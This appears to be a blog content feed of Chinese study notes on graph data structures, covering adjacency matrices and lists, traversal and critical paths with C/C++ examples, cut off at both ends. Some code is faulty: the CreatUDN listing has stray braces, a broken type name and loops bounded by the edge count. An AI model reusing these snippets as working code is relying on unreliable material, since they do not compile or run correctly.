class="hljs-built_in">empty</span>())&#123;<br>        <span class="hljs-keyword">auto</span> tem=stack.<span class="hljs-built_in">top</span>();<br>        std::cout&lt;&lt;tem.vex&lt;&lt;<span class="hljs-string">&quot;  &quot;</span>;<br>        i++;<br>        stack.<span class="hljs-built_in">pop</span>();<br><br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">const</span> <span class="hljs-keyword">auto</span> &amp;item:tem.nextPoint)&#123;<br>            <span class="hljs-keyword">if</span>(!--adjacencyLists[item-&gt;sub].in)&#123;<br>                stack.<span class="hljs-built_in">push</span>(adjacencyLists[item-&gt;sub]);<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    std::cout&lt;&lt;std::endl&lt;&lt;<span class="hljs-string">&quot;size: &quot;</span>&lt;&lt;i&lt;&lt;std::endl;<br>    <span class="hljs-keyword">if</span>(i==adjacencyLists.<span class="hljs-built_in">size</span>())&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    AMGraph amGraph;  <span class="hljs-comment">//图，以及邻接矩阵</span><br>    std::vector&lt;AdjacencyList&gt; adjacencyList;<br>    <span class="hljs-type">int</span> size;<br>    std::cout&lt;&lt;<span class="hljs-string">&quot;input size: &quot;</span>&lt;&lt;std::endl;<br>    std::cin &gt;&gt; size;<br>    <span class="hljs-built_in">CreatGraph</span>(amGraph, size);<br>    <span class="hljs-built_in">CreateAdjacencyList</span>(amGraph,adjacencyList);<br>    std::cout&lt;&lt;<span class="hljs-built_in">SopologicalSort</span>(adjacencyList);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><br></code></pre></td></tr></table></figure></li></ol><h3 id="关键路径"><a href="#关键路径" class="headerlink" title="关键路径"></a>关键路径</h3><ol><li><p>结点</p><p><code>ve(i,j)</code>表示事件<code>i,j</code>最早发生的时间</p><p><code>vl(v,j)</code>表示事情最迟的发生时间</p></li><li><p>边</p><p><code>e(a3)</code>表示活动最早的开始时间</p><p><code>l(a3)</code>表示活动最迟的开始时间</p><p><code>l(a3)-e(a3)</code>表示完成 <code>a3</code>的时间余量</p><p>若<code>e()==i()</code>则说明是路径上关键活动</p></li><li><p>部分公式 </p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E5%9B%BE/%E5%85%B3%E9%94%AE%E8%B7%AF%E5%BE%84%E7%9A%84%E5%85%AC%E5%BC%8F.jpg"></p><p>活动<code>i</code>发生的最早时间，等于时间<code>j</code>的最晚发生时间</p><p>活动<code>i</code>最晚发生时间，等于<code>k</code>的最晚发生时间</p></li><li><p>求关键路径</p></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>数据结构和算法</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>图</title>
    <link href="/2023/04/20/%E7%AE%97%E6%B3%95/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E5%9B%BE/"/>
    <url>/2023/04/20/%E7%AE%97%E6%B3%95/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E5%9B%BE/</url>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="图"><a href="#图" class="headerlink" title="图"></a>图</h1><h2 id="图的定义和基本术语"><a href="#图的定义和基本术语" class="headerlink" title="图的定义和基本术语"></a>图的定义和基本术语</h2><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E5%9B%BE/%E5%9B%BE%E7%9A%84%E5%AE%9A%E4%B9%89%E5%92%8C%E5%9F%BA%E6%9C%AC%E6%9C%AF%E8%AF%AD.png"></p><ol><li><p>完全图</p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E5%9B%BE/%E5%AE%8C%E5%85%A8%E5%9B%BE.png"></p><p>有<code>n</code>个点每个点都与<code>n-1</code>个点有边，但是注意如果是无向的边则应该是<code>n*(n-1)/2</code>。如果是有向的边，则应该是<code>n*(n-1)</code></p></li><li><p>稀疏图(e&lt;nlogn)</p><p><strong>带箭头的边称为狐</strong></p><p>有很少的边或狐的图</p></li><li><p>稠密图</p><p>有较多的边或狐的图</p></li><li><p>网</p><p>边&#x2F;狐带权（有意义，如：<code>20km</code>等）的图</p></li><li><p>邻接</p><p>有边&#x2F;狐相连的两个顶点之间的关系</p><p>根据离散的知识(V<del>i</del>,V<del>j</del>)这是不分先后的（小括号括起来），则说V<del>i</del>,V<del>j</del>互称为邻接点</p><p>&lt;V<del>i</del>,V<del>j</del>&gt;则则是有序的，对应有向的图V<del>i</del>邻接到V<del>j</del>，V<del>j</del>邻接于V<del>i</del></p></li><li><p>关联（依附）</p><p>边或者狐与顶点的关系</p></li><li><p>顶点的度</p><p>该顶点相关联的边的条数</p><p>在有向图当中，顶点的度等于该顶点的出度和入度之和</p><ul><li>入度：是以该顶点为终点的有向边</li><li>出度：是以该顶点为起点的有向边</li></ul><p>有向树</p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E5%9B%BE/%E6%9C%89%E5%90%91%E6%A0%91.png"></p></li><li><p>路径</p><p>按续的边构成的点的顶点序列</p></li><li><p>路径长度</p><p>路径上边或者狐的数目（权值）之和</p></li><li><p>环（回路）</p><p>第一个顶点和最后一个顶点相同的路径</p></li><li><p>简单的路径</p><p>除了路径的起点和终点可以相同，其他的都不同</p></li><li><p>简单的回路（简单的环）：除路径和终点相同，其他的顶点都不相同（注意区别简单路径和简单的回路）</p></li><li><p>连通图</p><p>就是图中任意的两个点都能够连接起来</p></li><li><p>权</p><p>图中的边或则弧线具有的相关的数被称为权。表明从一个顶点到另一个顶点的距离和消耗</p></li><li><p>网</p><p>带权的图</p></li><li><p>子图</p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E5%9B%BE/%E5%AD%90%E5%9B%BE.png"></p><p>如果一个图是；另一个图的一部分就说明是子图</p></li><li><p>连通分量</p><p>无向图的最大联通的子图就称为G 的连通分量</p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E5%9B%BE/%E8%BF%9E%E9%80%9A%E5%88%86%E9%87%8F.png"></p></li><li><p>强连通分量</p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E5%9B%BE/%E5%BC%BA%E8%BF%9E%E9%80%9A%E5%88%86%E9%87%8F.png"></p></li><li><p>极小连通子图</p><p>就是连通子图，如果再删除一条边，就不连通则说明是极小的连同子图</p></li><li><p>生成树</p><p>包含无向图的的所有的顶点的绩极小的联通子图</p></li><li><p>图和树的不同</p><ul><li>树是一种特殊的图，但是没有环，也就是说树的两个结点只有唯一路径</li><li>树的每一个节点有且仅有<code>1</code>或者<code>0</code>个前驱。但是树可以有多个前驱</li><li>树的每一个结点只会存在一种关系，即父子关系。但是图可以有多种关系。比如：有向边和无向边</li><li>树一般用于分层存储和处理数据，如文件系统等；而图则更加灵活，可以用于表示各种复杂关系和网络结构，如社交网络、电脑网络、交通网络等等。</li></ul></li><li><p>相同点</p><p>树和图是两种基本的非线性数据结构</p></li></ol><h2 id="图的存储结构"><a href="#图的存储结构" class="headerlink" title="图的存储结构"></a>图的存储结构</h2><h3 id="数组表示法（邻接矩阵）"><a href="#数组表示法（邻接矩阵）" class="headerlink" title="数组表示法（邻接矩阵）"></a>数组表示法（邻接矩阵）</h3><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E5%9B%BE/%E9%82%BB%E6%8E%A5%E7%9F%A9%E9%98%B5%E7%9A%84%E5%AE%9A%E4%B9%89.png"></p><p>使用矩阵的方式，如果两个点存在一个则对应的数组的值为<code>1</code>，反之为<code>0</code></p><p>无向图的邻接矩阵表示法</p><ol><li><p>临界矩阵的特点</p><ul><li>对角线值为0</li><li>矩阵是对称的</li></ul></li><li><p>矩阵度的计算</p><p>定点<code>i</code>的度，就是第<code>i</code>行<code>1</code>的个数</p><p>特别的完全图的邻接矩阵中，对角线元素为0，其余为1</p></li></ol><p><strong>有向图的邻接矩阵表示法</strong></p><ol><li><p>同理，有箭头的则是<code>1</code>，也就是从该点指出去</p></li><li><p>第<code>i</code>行的含义</p><p>以节点v<del>i</del>为结尾的弧（出度）</p></li><li><p>第<code>i</code>列的含义</p><p>以节点v<del>i</del>为头的弧（入度）</p></li><li><p>有向图的度</p><p>是出度和入度的和</p></li></ol><p><strong>邻接矩阵的实现</strong></p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E5%9B%BE/%E9%82%BB%E6%8E%A5%E7%9F%A9%E9%98%B5%E7%9A%84%E5%AE%9E%E7%8E%B0.png"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> MaxInt 32767   <span class="hljs-comment">//有向表的正无穷</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MVNum 100   <span class="hljs-comment">//最大定点数</span></span><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">char</span> VerTexType;   <span class="hljs-comment">//定点的类型</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">int</span> ArcType;      <span class="hljs-comment">//权值</span><br><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">AMGraph</span> &#123;</span><br>    VerTexType vexs[MVNum];   <span class="hljs-comment">//定点表</span><br>    ArcType arcs[MVNum][MVNum];   <span class="hljs-comment">//邻接矩阵</span><br>    <span class="hljs-type">int</span> vexnum, arcnum;<span class="hljs-comment">//图的当前点数和边的数目</span><br>&#125;AMGraph;<br><br></code></pre></td></tr></table></figure><p><strong>网的表示法</strong></p><ol><li>将有连接的转变成权值而不是<code>1</code></li><li>没有连接的为<code>0</code></li></ol><p><strong>无向图的创建</strong></p><ol><li><p>算法思想</p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E5%9B%BE/%E6%97%A0%E5%90%91%E7%BD%91%E7%9A%84%E5%88%9B%E5%BB%BA.png"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&quot;stdio.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&quot;stdlib.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MaxInt 32767   <span class="hljs-comment">//有向表的正无穷</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MVNum 100   <span class="hljs-comment">//最大定点数</span></span><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">char</span> VerTexType;   <span class="hljs-comment">//定点的类型</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">int</span> ArcType;      <span class="hljs-comment">//权值</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">int</span> statue;<br>   <br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">AMGraph</span> &#123;</span><br>    VerTexType vexs[MVNum];   <span class="hljs-comment">//定点表</span><br>    ArcType arcs[MVNum][MVNum];   <span class="hljs-comment">//邻接矩阵</span><br>    <span class="hljs-type">int</span> vexnum, arcnum;<span class="hljs-comment">//图的当前点数和边的数目</span><br>&#125;AMGraph,*pAMGraph;<br>   <br>   <br><span class="hljs-comment">//查找对应的下标</span><br><span class="hljs-comment">//int LocateVex(pAMGraph G,char ch) &#123;</span><br><span class="hljs-comment">//for (int i = 0; i &lt; G-&gt;vexnum; i++)</span><br><span class="hljs-comment">//&#123;</span><br><span class="hljs-comment">//if (ch == G-&gt;vexs[i]) &#123;</span><br><span class="hljs-comment">//return i;</span><br><span class="hljs-comment">//&#125;</span><br><span class="hljs-comment">//&#125;</span><br><span class="hljs-comment">//return -1;</span><br>&#125;<br>&#125;<br><span class="hljs-comment">//&#125;</span><br>   <br>statu ue <span class="hljs-title function_">CreatUDN</span><span class="hljs-params">(pAMGraph *G)</span> &#123;<br>    <span class="hljs-type">int</span> x, y;<span class="hljs-comment">//模拟二维数组的x,y;</span><br>    <span class="hljs-type">char</span> aPoint,bPoint;<span class="hljs-comment">//</span><br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d%d&quot;</span>, &amp;(*G)-&gt;vexnum, &amp;(*G)-&gt;arcnum);<br>    <span class="hljs-comment">//创建节点</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; (*G)-&gt;vexnum; i++)<br>    &#123;<br>        (*G)-&gt;vexs[i] = <span class="hljs-string">&#x27;A&#x27;</span> + i;<br>    &#125;<br>   <br>    <span class="hljs-comment">//初始化表</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; (*G)-&gt;arcnum; i++)<br>    &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; (*G)-&gt;arcnum; j++)<br>        &#123;<br>            (*G)-&gt;arcs[i][j] = MaxInt;<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">//赋予权值</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; (*G)-&gt;arcnum; i++)<br>    &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; (*G)-&gt;arcnum; j++)<br>        &#123;<br>            (*G)-&gt;arcs[i][j] = MaxInt;<br>        &#125;<br>    &#125; <br>   <br>    <span class="hljs-comment">////对每一条边进行赋值</span><br>    <span class="hljs-comment">//scanf(&quot;%c%c&quot;, &amp;aPoint,&amp;bPoint);//对a-&gt;b的边进行赋权</span><br>    <span class="hljs-comment">//x = LocateVex(G, aPoint);</span><br>    <span class="hljs-comment">//y = LocateVex(G, bPoint);</span><br>    <span class="hljs-comment">//for (int i = 0; i &lt; (*G)-&gt;vexnum; ++i) &#123;</span><br>    <span class="hljs-comment">//scanf(&quot;%d&quot;, &amp;(*G)-&gt;arcs[x][y]);</span><br>    <span class="hljs-comment">//(*G)-&gt;arcs[x][y] = (*G)-&gt;arcs[y][x];//无向网，所以邻接矩阵是对称的</span><br>   <br>    <span class="hljs-comment">//&#125;</span><br>&#125;<br>   <br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    pAMGraph G = (pAMGraph)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(AMGraph));<br>    CreatUDN(&amp;G);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li></ol><p><strong>邻接矩阵构建有向图</strong></p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E5%9B%BE/%E9%82%BB%E6%8E%A5%E7%9F%A9%E9%98%B5%E6%9C%89%E5%90%91%E5%9B%BE.png"></p><p><strong>使用邻接矩阵的优点</strong></p><blockquote><ol><li><p>直观简单</p></li><li><p>方便查看某个图的节点</p></li><li><p>方便查找任意节点的邻接点</p></li><li><p>方便计算出某个节点的度</p></li></ol></blockquote><p><strong>使用邻接矩阵的缺点</strong></p><blockquote><p>空间复杂度是O(n^2^)</p></blockquote><h3 id="多重链表"><a href="#多重链表" class="headerlink" title="多重链表"></a>多重链表</h3><ol><li><p>邻接表 </p><p><strong>无向图</strong></p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E5%9B%BE/%E9%82%BB%E6%8E%A5%E8%A1%A8.png"></p><ul><li><p>头结点</p><ul><li><p>第一个元素</p><p>存放定点的数据</p></li><li><p>第二个元素</p><p>存放边节点</p></li></ul></li><li><p>表结点（边节点）</p><ul><li><p>第一个元素</p><p>存放弧终点的节点</p></li><li><p>第二个元素</p><p>存放另一个弧终点的地址</p></li><li><p>第三个元素（图片无）</p><p>存放权值</p></li></ul></li><li><p>不唯一性</p><p>因为每一个边的链表顺序可以变</p><p>按道理来说，应该会有很多种</p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E5%9B%BE/%E9%82%BB%E6%8E%A5%E8%A1%A8%E7%9A%84%E7%89%B9%E7%82%B9.png"></p></li><li><p>使用邻接矩阵创建邻接表</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs c">    <span class="hljs-meta">#<span class="hljs-keyword">define</span> MaxInt 32767   <span class="hljs-comment">//有向表的正无穷</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MVNum 100       <span class="hljs-comment">//最大定点数</span></span><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">char</span> VerTexType;   <span class="hljs-comment">//定点的类型</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">int</span> ArcType;      <span class="hljs-comment">//权值</span><br>     <br>     <br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">AMGraph</span> &#123;</span><br>    VerTexType vexs[MVNum];   <span class="hljs-comment">//顶点表</span><br>    ArcType arcs[MVNum][MVNum];   <span class="hljs-comment">//邻接矩阵</span><br>    <span class="hljs-type">int</span> vexnum, arcnum;<span class="hljs-comment">//图的当前点数和边的数目</span><br>&#125; AMGraph;<br>     <br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">node</span> // 边表节点</span><br><span class="hljs-class">&#123;</span><br>    VerTexType adjvex; <span class="hljs-comment">// 与顶点相连的邻接点下标(adjoin：邻接)</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">node</span> *<span class="hljs-title">next</span>;</span> <span class="hljs-comment">// 指向顶点的下一个邻接点</span><br>&#125; EdgeNode;<br>     <br>     <br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vnode</span>       // 顶点结构</span><br><span class="hljs-class">&#123;</span><br>    VerTexType vex;      <span class="hljs-comment">// 存储顶点名</span><br>    EdgeNode *firstedge; <span class="hljs-comment">// 边表头指针，指向顶点第一个邻接点</span><br>&#125; VertexNode, AdjList[MVNum];<br>     <br><span class="hljs-type">void</span> <span class="hljs-title function_">creatGraph</span><span class="hljs-params">(AMGraph **amGraph)</span> &#123;<br>    *amGraph = (AMGraph *) <span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(AMGraph));<br>    (*amGraph)-&gt;vexnum = <span class="hljs-number">0</span>;<br>    (*amGraph)-&gt;arcnum = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">6</span>; ++i) &#123;<br>        (*amGraph)-&gt;vexs[i] = <span class="hljs-string">&#x27;A&#x27;</span> + i;<br>        (*amGraph)-&gt;vexnum++;<br>     <br>    &#125;<br>    <span class="hljs-comment">//创建邻接矩阵</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">6</span>; ++i) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">6</span>; ++j) &#123;<br>            <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;(*amGraph)-&gt;arcs[i][j]);<br>            <span class="hljs-keyword">if</span> ((*amGraph)-&gt;arcs[i][j] == <span class="hljs-number">1</span>) &#123;<br>                (*amGraph)-&gt;arcnum++;<br>            &#125;<br>        &#125;<br>    &#125;<br>    (*amGraph)-&gt;arcnum /= <span class="hljs-number">2</span>;<br>     <br>&#125;<br>     <br><span class="hljs-type">void</span> <span class="hljs-title function_">creatAdjacencyList</span><span class="hljs-params">(AMGraph *amGraph, AdjList adjList)</span> &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; amGraph-&gt;vexnum; ++i) &#123;<br>        adjList[i].vex = amGraph-&gt;vexs[i];<br>        adjList[i].firstedge = <span class="hljs-literal">NULL</span>;<br>        EdgeNode *moveNode = <span class="hljs-literal">NULL</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; amGraph-&gt;vexnum; ++j) &#123;<br>            <span class="hljs-comment">//下面就是创建链表的过程，只是在第一个的时候相当于创建头节点</span><br>            <span class="hljs-keyword">if</span> (amGraph-&gt;arcs[i][j] == <span class="hljs-number">1</span>) &#123;<span class="hljs-comment">//=1说明连同</span><br>                <span class="hljs-keyword">if</span> (adjList[i].firstedge == <span class="hljs-literal">NULL</span>) &#123;<br>                    adjList[i].firstedge=(EdgeNode *)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span> (<span class="hljs-keyword">struct</span> node));<br>                    adjList[i].firstedge-&gt;adjvex = amGraph-&gt;vexs[j];<br>                    adjList[i].firstedge-&gt;next=<span class="hljs-literal">NULL</span>;<br>                    moveNode = adjList[i].firstedge;<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    EdgeNode *tem=(EdgeNode*)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(EdgeNode));<br>                    tem-&gt;adjvex=amGraph-&gt;vexs[j];<br>                    tem-&gt;next=<span class="hljs-literal">NULL</span>;<br>                    moveNode-&gt;next=tem;<br>                    moveNode=moveNode-&gt;next;<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br>     <br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    AMGraph *amGraph;<span class="hljs-comment">//邻接表</span><br>    AdjList adjList=&#123;<span class="hljs-number">0</span>&#125;;<span class="hljs-comment">//邻接表的点集合，全部初始化</span><br>    <span class="hljs-type">int</span> ints[<span class="hljs-number">6</span>] = &#123;<span class="hljs-number">0</span>&#125;;<span class="hljs-comment">//在搜索中，记录是否别查看</span><br>    creatGraph(&amp;amGraph);<span class="hljs-comment">//创建邻接矩阵</span><br>    creatAdjacencyList(amGraph,adjList);<span class="hljs-comment">//创建邻接表</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li></ul><p><strong>有向图</strong></p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E5%9B%BE/%E6%9C%89%E5%90%91%E5%9B%BE%E7%9A%84%E9%82%BB%E6%8E%A5%E8%A1%A8.png"></p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E5%9B%BE/%E9%80%86%E9%82%BB%E6%8E%A5%E8%A1%A8%E5%92%8C%E9%82%BB%E6%8E%A5%E8%A1%A8%E7%9A%84%E5%AF%B9%E6%AF%94.png"></p></li><li><p>邻接多重表</p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E5%9B%BE/%E9%82%BB%E6%8E%A5%E5%A4%9A%E9%87%8D%E8%A1%A8.png"></p><p>每个数字后面的空格都是，存放指针，用于连接</p><ul><li>连接顺序不唯一</li></ul></li><li><p>十字链表</p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E5%9B%BE/%E5%8D%81%E5%AD%97%E9%93%BE%E8%A1%A8.png"></p><p>给顶点结点加一个指向出度边的指针</p><p>给狐结点添一个把该节点当成头节点的狐的数据域和指针域</p><p>优点：有利于找到出度和入度，通过<code>head</code>可以找到整个入度的边</p></li></ol><h2 id="图的遍历"><a href="#图的遍历" class="headerlink" title="图的遍历"></a>图的遍历</h2><ul><li><p>遍历的实质</p></li><li><p>怎么防止重复访问？</p><p>图中含有回路，而且每一个顶点都与其他顶点相通，所以可能通过某一个过程又回到了原来的点</p><blockquote><p>设置一个辅助的数组，用来标记每一个被访问的顶点，初始状态为<code>0</code></p><p>被访问了，就应该改变状态</p></blockquote><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E5%9B%BE/%E5%9B%BE%E7%9A%84%E9%81%8D%E5%8E%86.png"></p></li></ul><h3 id="深度优先搜索（DFS）"><a href="#深度优先搜索（DFS）" class="headerlink" title="深度优先搜索（DFS）"></a>深度优先搜索（<code>DFS</code>）</h3><h4 id="邻接矩阵"><a href="#邻接矩阵" class="headerlink" title="邻接矩阵"></a><strong>邻接矩阵</strong></h4><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E5%9B%BE/%E6%B7%B1%E5%BA%A6%E4%BC%98%E5%85%88%E6%90%9C%E7%B4%A2.png"></p><ul><li><p>采取递归的方法</p></li><li><p>防止循环遍历，我们应该建立一个<code>visit</code>存放所有的结点，然后我们把遍历过的结点标识为<code>1</code></p></li><li><p>代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span 